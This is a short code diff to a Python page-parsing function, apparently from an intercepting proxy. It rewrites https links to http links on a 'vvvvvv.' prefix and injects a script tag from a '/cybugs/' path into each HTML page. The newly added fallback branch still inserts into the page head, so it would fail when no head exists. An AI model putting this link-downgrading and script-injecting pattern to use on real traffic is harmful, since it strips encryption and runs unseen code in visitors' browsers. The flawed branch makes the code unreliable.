@@ -23,7 +23,7 @@ def parse(page:bytes , domainName :str , path : str  , pageType : str  ):
 
 
     page =  page.replace("http://","http://vvvvvv.")
-    page = re.sub("https:\/\/([^w])",lambda x :f"http:\/\/vvvvvv.{x.group(1)}",page)
+    page = re.sub("https:\/\/([^w])",lambda x :f"http://vvvvvv.{x.group(1)}",page)
     page  = page.replace("https://www.","http://vvvvvv.")
     print(pageType)
     if  "text/html" not  in pageType : 
@@ -37,7 +37,10 @@ def parse(page:bytes , domainName :str , path : str  , pageType : str  ):
             scriptInject.attrs['src'] = f"/cybugs/{fileName}"
             scriptInject.attrs['type']="text/javascript"
             scriptInject.attrs['charset']="utf-8"
-            soup.head.insert(0,scriptInject)
+            if soup.head :
+                soup.head.insert(0,scriptInject)
+            elif soup.body :
+                soup.head.insert(0,scriptInject)
     page =  soup.prettify()
     return page 
 
